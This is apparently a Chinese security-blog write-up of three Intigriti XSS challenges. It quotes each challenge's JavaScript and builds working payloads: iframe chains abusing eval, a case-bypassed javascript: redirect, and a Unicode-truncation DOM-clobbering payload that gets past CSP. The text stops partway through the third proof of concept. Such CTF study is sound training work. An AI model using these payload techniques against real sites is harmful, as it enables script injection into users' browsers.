> 原文链接: https://www.anquanke.com//post/id/239198 


# Intigriti  XSS 系列挑战 Writeups


                                阅读量   
                                **461665**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01d7b84ac6277e8782.png)](https://p1.ssl.qhimg.com/t01d7b84ac6277e8782.png)



## 0x01 xss challenge 1220

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"></a>题目概述

地址：[https://challenge-1220.intigriti.io/](https://challenge-1220.intigriti.io/) ，挑战有以下要求：
- 使用最新版的Firefox或者Chrome浏览器
<li>执行JS：`alert(document.domian)`
</li>
- 在域名`challenge-1220.intigriti.io`下被执行
- 不允许self-XSS 和 MiTM 攻击
### <a class="reference-link" name="%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"></a>思路分析

可以看到页面上有一个计算器，尝试进行一些简单的操作，能发现url中会加入一些参数：

```
https://challenge-1220.intigriti.io/?num1=6&amp;operator=%2B&amp;num2=6
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01faf5301b787e05e9.png)

检查页面源码，查看JS文件`script.js`:

```
window.name = "Intigriti's XSS challenge";

const operators = ["+", "-", "/", "*", "="];
function calc(num1 = "", num2 = "", operator = "")`{`
  operator = decodeURIComponent(operator);
  var operation = `$`{`num1`}`$`{`operator`}`$`{`num2`}``;
  document.getElementById("operation").value = operation;
  if(operators.indexOf(operator) == -1)`{`
    throw "Invalid operator.";
  `}`
  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2)))`{`
    throw "No special characters."
  `}`
  if(operation.length &gt; 20)`{`
    throw "Operation too long.";
  `}`
  return eval(operation);
`}`

function init()`{`
  try`{`
    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
  `}`
  catch(ex)`{`
    console.log(ex);
  `}`
`}`

function getQueryVariable(variable) `{`
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
    var vars = searchQueryString.split('&amp;');
    var value;
    for (var i = 0; i &lt; vars.length; i++) `{`
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) `{`
            value = decodeURIComponent(pair[1]);
        `}`
    `}`
    return value;
`}`

/*
 The code below is calculator UI and not part of the challenge
*/

window.onload = function()`{`
 init();
 var numberBtns = document.body.getElementsByClassName("number");
 for(var i = 0; i &lt; numberBtns.length; i++)`{`
   numberBtns[i].onclick = function(e)`{`
     setNumber(e.target.innerText)
   `}`;
 `}`;
 var operatorBtns = document.body.getElementsByClassName("operator");
 for(var i = 0; i &lt; operatorBtns.length; i++)`{`
   operatorBtns[i].onclick = function(e)`{`
     setOperator(e.target.innerText)
   `}`;
 `}`;

  var clearBtn = document.body.getElementsByClassName("clear")[0];
  clearBtn.onclick = function()`{`
    clear();
  `}`
`}`

function setNumber(number)`{`
  var url = new URL(window.location);
  var num1 = getQueryVariable('num1') || 0;
  var num2 = getQueryVariable('num2') || 0;
  var operator = getQueryVariable('operator');
  if(operator == undefined || operator == "")`{`
    url.searchParams.set('num1', parseInt(num1 + number));
  `}`
  else if(operator != undefined)`{`
    url.searchParams.set('num2', parseInt(num2 + number));
  `}`
  window.history.pushState(`{``}`, '', url);
  init();
`}`

function setOperator(operator)`{`
  var url = new URL(window.location);
  if(getQueryVariable('num2') != undefined)`{` //operation with previous result
    url.searchParams.set('num1', calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator")));
    url.searchParams.delete('num2');
    url.searchParams.set('operator', operator);
  `}`
  else if(getQueryVariable('num1') != undefined)`{`
    url.searchParams.set('operator', operator);
  `}`
  else`{`
    alert("You need to pick a number first.");
  `}`
  window.history.pushState(`{``}`, '', url);
  init();
`}`

function clear()`{`
    var url = new URL(window.location);
    url.searchParams.delete('num1');
    url.searchParams.delete('num2');
    url.searchParams.delete('operator');
    window.history.pushState(`{``}`, '', url);
    document.getElementById("result").value = "";
    init();
`}`
```

可以看到`cals()`函数包含`eval()`，但同时也对参数的类型和长度进行了一些限制：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://gitee.com/gscr10/picture/raw/master/20210420214209.png)!

这里先忽略长度20的限制。如果我们能控制`location`的值就可以执行xss:

[![](https://p1.ssl.qhimg.com/t0124c672cfd145f5c6.png)](https://p1.ssl.qhimg.com/t0124c672cfd145f5c6.png)

所以我们需要找到一个可控的全局变量：

[![](https://p4.ssl.qhimg.com/t01c9c8a129030dfd5c.png)](https://p4.ssl.qhimg.com/t01c9c8a129030dfd5c.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0143b25fd4455f91ae.png)

经过分析，发现`searchQueryString`，内容就是URL后面附加的一堆参数：

```
window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01387de31d2acc469d.png)

因此，构造payload`?javascript:alert(1)//num1=9&amp;operator=%2B&amp;num2=searchQueryString`，则`searchQueryString`的值就包含`javascript:alert(1)`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0158eb313d70996dc2.png)

现在只需要让`location`等于`searchQueryString`，构造payload：`?javascript:alert(1)//&amp;num1=loaction&amp;operator=-&amp;num2=searchQueryString`:

[![](https://p4.ssl.qhimg.com/t01e655007b54dc828a.png)](https://p4.ssl.qhimg.com/t01e655007b54dc828a.png)

但在执行过程中`eval(operation);`内`operation`为`location=searchQueryString`，长度超过20被限制。因此，现在需要绕过长度20的限制。

为了能缩短长度，经过研究，可以首先让`a=searchQueryString`(len=19)，然后再让`location=a`(len=10):

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a88562c6fbb7ce41.png)

为了达到这个目标，需要以下条件：
- 整个过程需要至少执行两次（`a=searchQueryString`及`location=a` ）
- 在两次执行中，需要能改变参数`num1` `num2`的值（两次执行对应的参数值不同）
通过观察，`clear()`函数与`window.onload`均包含`init()`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01529b12570dd2458c.png)

[![](https://p5.ssl.qhimg.com/t014f22a01569a07b7c.png)](https://p5.ssl.qhimg.com/t014f22a01569a07b7c.png)

### <a class="reference-link" name="POC"></a>POC

#### <a class="reference-link" name="a.%E6%9C%89%E4%BA%A4%E4%BA%92"></a>a.有交互

利用`clear()`函数实现xss，需要用户交互，构造payload：

```
# html
&lt;iframe id="intigriti" src="https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&amp;num1=a&amp;operator=%3D&amp;num2=searchQueryString"  style="border-style:none;" width=500 hight=500&gt;&lt;/iframe&gt;

# javascritp

setTimeout(secondchange, 1000);
function secondchange() `{`
    document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&amp;num1=location&amp;operator=%3D&amp;num2=a";
`}`
```

点击计算器`C`键，调用`clear() ==&gt; init()`，实现第二次执行，成功实现xss:

[![](https://p2.ssl.qhimg.com/t0108181d34278efb5d.png)](https://p2.ssl.qhimg.com/t0108181d34278efb5d.png)

#### <a class="reference-link" name="b.%E6%97%A0%E4%BA%A4%E4%BA%92"></a>b.无交互

为了实现无需用户交互下的xss，可用构造`onhashchange="init"` 事件，每当hash变化后就调用`init`:

```
# html
&lt;iframe id="intigriti" src="https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&amp;num1=onhashchange&amp;operator=%3D&amp;num2=init"  style="border-style:none;" width=500 hight=500&gt;&lt;/iframe&gt;

# javascritp

setTimeout(firstchange, 1000);
setTimeout(secondchange, 2000);

function firstchange() `{`
  document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&amp;num1=a&amp;operator=%3D&amp;num2=searchQueryString";
`}`

function secondchange() `{`
    document.querySelector("#intigriti").src = "https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//#&amp;num1=location&amp;operator=%3D&amp;num2=a";
`}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a9f14708677d416f.png)



## 0x02 xss challenge 0121

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"></a>题目概述

地址：[https://challenge-0121.intigriti.io/](https://challenge-0121.intigriti.io/) ，挑战有以下要求：
- 使用最新版的Firefox或者Chrome浏览器
- 通过`alert()`弹出 `{`THIS_IS_THE_FLAG`}`
- 利用此页面的xss漏洞
- 不允许self-XSS 和 MiTM 攻击
### <a class="reference-link" name="%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"></a>思路分析

查看网页JS代码：

```
window.href = new URL(window.location.href);
  window.r = href.searchParams.get("r");
  //Remove malicious values from href, redirect, referrer, name, ...
  ["document", "window"].forEach(function(interface)`{`
    Object.keys(window[interface]).forEach(function(globalVariable)`{`
        if((typeof window[interface][globalVariable] == "string") &amp;&amp; (window[interface][globalVariable].indexOf("javascript") &gt; -1))`{`
            delete window[interface][globalVariable];
        `}`
    `}`);
  `}`);

  window.onload = function()`{`
    var links = document.getElementsByTagName("a");
    for(var i = 0; i &lt; links.length; i++)`{`
      links[i].onclick = function(e)`{`
        e.preventDefault();
        safeRedirect(e.target.href);
      `}`
    `}`
  `}`
  if(r != undefined)`{`
    safeRedirect(r);
  `}`
  function safeRedirect(url)`{`
    if(!url.match(/[&lt;&gt;"' ]/))`{`
      window.setTimeout(function()`{`
          if(url.startsWith("https://"))`{`
            window.location = url;
          `}`
          else`{` //local redirect
            window.location = window.origin + "/" + url;
          `}`
          window.setTimeout(function()`{`
            document.getElementById("error").style.display = "block";
          `}`, 1000);
      `}`, 5000);
      document.getElementById("popover").innerHTML = `
        &lt;p&gt;You're being redirected to $`{`url`}` in 5 seconds...&lt;/p&gt;
        &lt;p id="error" style="display:none"&gt;
          If you're not being redirected, click &lt;a href=$`{`url`}`&gt;here&lt;/a&gt;
        &lt;/p&gt;.`;
    `}`
    else`{`
      alert("Invalid URL.");
    `}`
  `}`
```

首先定义了一个搜索参数`r`：`window.r = href.searchParams.get（"r"）;`，然后对`document` `window`的所有属性进行循环检查并加限制，如果属性为字符串且包含`javastript`，则被删除:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e76c160130ccd99f.png)

最后可以看到一个可疑的`safeRedirect()`函数，当`r`未定义就会被传入到这个函数中。并且对参数`url`进行了限制，不允许包含`&lt;` `&gt;` `"` `'` `(空格)` ，如果`url`以`https://`开头，`window.location`设为该URL；如果不是，则将`window.location` 设为`window.origin + "/" + url`。此外，通过`error`的重定向，可以将`&lt;a href=$`{`url`}`&gt;here&lt;/a&gt;`嵌入到网页中。

综上分析，目前有几个点需要突破：
<li>
`javastript` 不能出现在`r`参数中；</li>
<li>
`&lt;` `&gt;` `"` `'` `(空格)` 不能出现在`r`参数中；</li>
- 通过error信息嵌入html标签；
- 由于`window.origin` 为`https://challenge-0121.intigriti.io` 所以url总以`https://`开头，则不能被控制；
首先尝试进行一个简单的重定向尝试，输出入`https://challenge-0121.intigriti.io/?r=aaaaaa`被重定向到 `https://challenge-0121.intigriti.io/aaaaaa` 且嵌入了标签：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0162bbea8ad34bc9c1.png)

当将`%0a`插入到`r`的值中，如`r=aaa%0aaaa=bbb`时，嵌入的标签就可以被控制：

[![](https://p2.ssl.qhimg.com/t0156b58fce279fe04e.png)](https://p2.ssl.qhimg.com/t0156b58fce279fe04e.png)

为了能使`window.location` 被设为`window.origin + "/" + url`，则需要`window.orgin`不以`https://`开头，但该默认网页的`window.orgin`无法更改（总是`https://challenge-0121.intigriti.io`），所以这里需要换一种思路思考。

[![](https://p1.ssl.qhimg.com/t01533f54d8f41fe4dd.png)](https://p1.ssl.qhimg.com/t01533f54d8f41fe4dd.png)

我注意到本题的要求“通过`alert()`弹出 `{`THIS_IS_THE_FLAG`}`”“在这个页面实现XSS” ，而不像其他题目需要执行“`alert(document.domian)`或者`alert(origin)`”“在域名challenge.intigriti.io在实现XSS”，那么有可能通过本挑战一个特定的子域名`*.challenge-0121.intigriti.io`来控制`window.origin`的值，从而达到控制`window.location` 的目的。

通过Sublist3r工具进行寻找，发现了子域名:`javascript.challenge-0121.intigriti.io`的`window.origin`没有被定义：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b42408c1c42283f6.png)

`https://javascript.challenge-0121.intigriti.io/?r=aaaaaa`被重定向到`https://javascript.challenge-0121.intigriti.io/undefined/aaaaaa`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d1f154647eeadc66.png)

如此一来，结合前面的可控的嵌入的html标签，即可控制`window.origin`的值。构造`r=aaa%0aid=origin`：

[![](https://p2.ssl.qhimg.com/t01398d6c7e9ebf1fe4.png)](https://p2.ssl.qhimg.com/t01398d6c7e9ebf1fe4.png)

进一步构造`r=https://attack.com%0aid=origin`，可以看到：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01528299c1d3075ee4.png)

并且被重定向到attack的地址：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d74fbb1a6812632c.png)

利用大小写可以绕过“`javastript` 不能出现在`r`参数中”的限制，因此，我们可以构造payload：`r=jAvascript:alert(1)/%0aid=origin`，即可执行xss:

[![](https://p0.ssl.qhimg.com/t0132f1c6ce08b957d1.png)](https://p0.ssl.qhimg.com/t0132f1c6ce08b957d1.png)

为了弹出 `{`THIS_IS_THE_FLAG`}`，由于`&lt;` `&gt;` `"` `'` `(空格)` 不能出现在`r`参数中，可以使用 `号；或者使用`flag.innerHTML`。

### <a class="reference-link" name="POC"></a>POC

最终的payload:

```
https://javascript.challenge-0121.intigriti.io/?r=jAvascript:alert(flag.innerHTML)/%0aid=origin
```

[![](https://p3.ssl.qhimg.com/t01745ecd2491fff46d.png)](https://p3.ssl.qhimg.com/t01745ecd2491fff46d.png)

```
https://javascript.challenge-0121.intigriti.io/?r=jAvascript:alert(``{`THIS_IS_THE_FLAG`}``)/%0aid=origin
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b19323e41c48198d.png)



## 0x03 xss challenge 0221

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"></a>题目概述

地址：[https://challenge-0221.intigriti.io/](https://challenge-0221.intigriti.io/)<br>
该挑战是根据真实漏洞场景改编而来，挑战有以下要求：
<li>触发`alert(origin)`
</li>
- 绕过CSP限制
- 不需要用户交互
- 使用最新版的Firefox或者Chrome浏览器
- 利用此页面的xss漏洞
- 不允许self-XSS 和 MiTM 攻击
### <a class="reference-link" name="%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"></a>思路分析

首先分析网页功能，随便输入一些字符串：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c0d3d3be4ee8cd1a.png)

可以看到网页反馈提示收到提交信息，并可以生成一个`share link`。点击`share link`，浏览器地址栏生成带有参数的地址如下：

```
https://challenge-0221.intigriti.io/?assignmentTitle=aaaaaaaaaaaa&amp;assignmentText=aaaaaaaaaaaaaaaaa...
```

由此可以判定，可以利用参数值构造payload形成xss。

检查网页源码，发现`script.js`:

[![](https://p2.ssl.qhimg.com/t01ed613223fc992ddf.png)](https://p2.ssl.qhimg.com/t01ed613223fc992ddf.png)

```
function startGrade() `{`
  var text = document.getElementById("assignmentText").value;
  checkLength(text);
  result = window.result || `{`
    message: "Your submission is too short.",
    error: 1,
  `}`; //If the result object hasn't been defined yet, the submission must be too short
  if (result.error) `{`
    endGrade();
  `}` else `{`
    getQAnswer();
    if (!passQuiz()) `{`
      result.message = "We don't allow robots at the Unicodeversity (yet)!";
      result.error = 1;
    `}` else `{`
      result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
    `}`
    endGrade();
  `}`
`}`

function endGrade() `{`
  document.getElementById("message").innerText = result.message;
  if (result.grade) `{`
    document.getElementById(
      "grade"
    ).innerText = `You got a(n) $`{`result.grade`}`!`;
  `}`
  document.getElementById("share").style.visibility = "initial";
  document.getElementById(
    "share-link"
  ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=$`{`
    document.getElementById("assignmentTitle").value
  `}`&amp;assignmentText=$`{`document.getElementById("assignmentText").value`}``;
  delete result;
`}`

function checkLength(text) `{`
  if (text.length &gt; 50) `{`
    result = `{` message: "Thanks for your submission!" `}`;
  `}`
`}`

function getQAnswer() `{`
  var answer = document.getElementById("answer").value;
  if (/^[0-9]+$/.test(answer)) `{`
    if (typeof result !== "undefined") `{`
      result.questionAnswer = `{` value: answer `}`;
    `}` else `{`
      result = `{` questionAnswer: `{` value: answer `}` `}`;
    `}`
  `}`
`}`

function passQuiz() `{`
  if (typeof result.questionAnswer !== "undefined") `{`
    return eval(result.questionAnswer.value + " == " + question);
  `}`
  return false;
`}`

var question = `$`{`Math.floor(Math.random() * 10) + 1`}` + $`{`
  Math.floor(Math.random() * 10) + 1
`}``;

document.getElementById("question").innerText = `$`{`question`}` = ?`;

document.getElementById("submit").addEventListener("click", startGrade);

const urlParams = new URLSearchParams(location.search);
if (urlParams.has("autosubmit")) `{`
  startGrade();
`}`
```

对`script.js`进行分析，发现几个有意思的点。一是`passQuiz`函数中存在`eval`方法，可能会被用来执行我们的js payload:

[![](https://p3.ssl.qhimg.com/t019299ebeac2fd640b.png)](https://p3.ssl.qhimg.com/t019299ebeac2fd640b.png)

其中`result.questionAnswer.value`由`getAnswer`函数获得，但对`answer`参数进行了限制，只能是数字。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012fb7eeb0b8634a73.png)

第二个点是，url中可以包含`autosubmit`参数，可以用来满足题目中”不需要用户交互”的要求：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fa5117e60596b0b7.png)

从页面的提示，该挑战涉及到 Unicode编码:

> Welcome to the Unicodeversity’s Well-trusted Assignment Computer Knowledge system, where we primarily focus on your ability to use cool Unicode and not so much on the content of your submissions

尝试输入特殊的Unicode字符`π`(`U+03C0`)。当直接在输入框中输时，页面不允许：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d1efee5f9ae8cdf7.png)

直接在url中输入，可以看到页面显示如下：

[![](https://p5.ssl.qhimg.com/t017155c88ba0e3474d.png)](https://p5.ssl.qhimg.com/t017155c88ba0e3474d.png)

[![](https://p0.ssl.qhimg.com/t015fdedbcb608cd861.png)](https://p0.ssl.qhimg.com/t015fdedbcb608cd861.png)

其中`(特殊方框)`+`c0`引起了我的注意。通过查询`(特殊方框)`可知它为`U+0003`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012177174ec2c0f2dc.png)

以此为例，通过其他Unicode字符测试可以判定，当我们输入一个特定的Unicode字符形如 U+abcd 时，会被解析为`U+00ab`+`cd`。

由于输入在`&lt;inupt&gt;`标签中，我们需要对标签进行闭合，构造xss payload。首先的思路是尝试通过`"`对`value=`进行闭合，并添加事件属性`onmouseover=alert(1)`。依照次思路，我们需要按照页面解析Unicode字符的规律进行构造payload。

```
" —— U+0022
∢ —— U+2222
```

因为`"`的Unicode编码为`U+0022`，则`∢( U+2222)`会被解析为`"+22`，从而成功闭合：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f6e1c03b371ec05e.png)

构造payload `∢ onmouseover=alert(1)&amp;autosubmit` 没有被执行，发现被CSP拦截：

[![](https://p3.ssl.qhimg.com/t011d00544f583f4815.png)](https://p3.ssl.qhimg.com/t011d00544f583f4815.png)

此路不通，需要换个角度执行js。页面允许`script.js`执行，可以用来绕过CSP。通过上面对`script.js`的分析，我们可以利用`eval`方法执行payload。那么现在的问题就变成了，如何操控`result.questionAnswer.value`。从上面的分析可以知道，想绕过`getAnswer`函数的限制是不可能的。通过分析`result`并没有定义：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0153e89adfc2e6e4c9.png)

所以我们可以自己定义`result`进而操控最终的`result.questionAnswer.value`。<br>
首先通过直接修改页面Html验证可行性。如果我们在页面中插入`&lt;input id=result&gt;`，则能定位到`result`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c988522ba2d6f2df.png)

为了能进一步定位到`queationAnswer`，构造新的标签`&lt;input id=result name=questionAnswer value=alert(1)&gt;`，并使得`value=alert(1)`:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019ec385d4dfbdb1f3.png)

这时，当`eval(result.questionAnswer.value + " == " + question);`语句被执行时，我们已经将`result.questionAnswer.value`的值覆盖为`alert(1)`，便可成功弹窗：

[![](https://p2.ssl.qhimg.com/t013c9d137fee2cde09.png)](https://p2.ssl.qhimg.com/t013c9d137fee2cde09.png)

以上思路的可行性验证完毕，需要构造如下payload，首先对原始的`input`标签进行闭合，然后插入新的标签：

```
"&gt;
&lt;input id=result&gt;
&lt;input id=result name=questionAnswer value=alert(1)&gt;
```

寻找特殊的Unicode字符：

```
" —— U+0022    ∢ —— U+2222   ===&gt;  "22
&gt; —— U+003E    㺪 —— U+3EAA   ===&gt;  &gt;aa
&lt; —— U+003C    㲪 —— U+3EAA   ===&gt;  &lt;aa
```

所以，进行Unicode替换的payload为：

```
∢㺪㲪input%20id=result㺪㲪input%20id=result%20name=questionAnswer%20value=alert(1)㺪&amp;autosubmit
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01257e3cc9898d387f.png)

但payload并没有成功执行，原因是`㲪(U+3EAA)input` 形成了`&lt;aainput`这一无效标签。由于页面对Unicode字符的解析，必然导致最后两位字符一直存在，无法去除。所以需要对这两位字符进行利用。思路是构造`(后两位字符)+(某个字符串)`的一个有效的标签，且允许含有`value`属性。

通过对html 标签进行研究，最终找到`&lt;data&gt;`标签满足需求：

[![](https://p5.ssl.qhimg.com/t01820b4b0c956a5c54.png)](https://p5.ssl.qhimg.com/t01820b4b0c956a5c54.png)

### <a class="reference-link" name="POC"></a>POC

构造以`&lt;data&gt;`为基础的有效payload：

```
"&gt;
&lt;data id=result&gt;
&lt;data id=result name=questionAnswer value=alert(1)&gt;
```

需要的特殊Unicode字符为：

```
